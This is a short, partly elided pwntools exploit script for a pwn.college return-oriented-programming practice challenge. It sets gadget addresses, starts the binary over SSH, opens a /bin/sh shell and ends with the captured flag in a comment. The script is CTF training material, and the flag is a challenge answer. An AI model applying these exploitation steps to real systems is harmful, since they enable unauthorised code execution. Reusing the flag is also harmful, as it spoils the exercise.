...
elf = context.binary = ELF("./babyrop_level9.0")
libc = ELF("./libc.so.6", checksec=False)
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

pos1 = 0x4150E0
pop_rdi = 0x0000000000402583
pop_rsp_pop3 = 0x000000000040257d

io = s.process("/challenge/babyrop_level9.0")
...
sh = s.shell(b'/bin/sh')
sh.interactive()
# Flag: pwn.college{0wvud09XmXOfpPPBVTDnjcGpHRE.01N1MDLxIjNyEzW}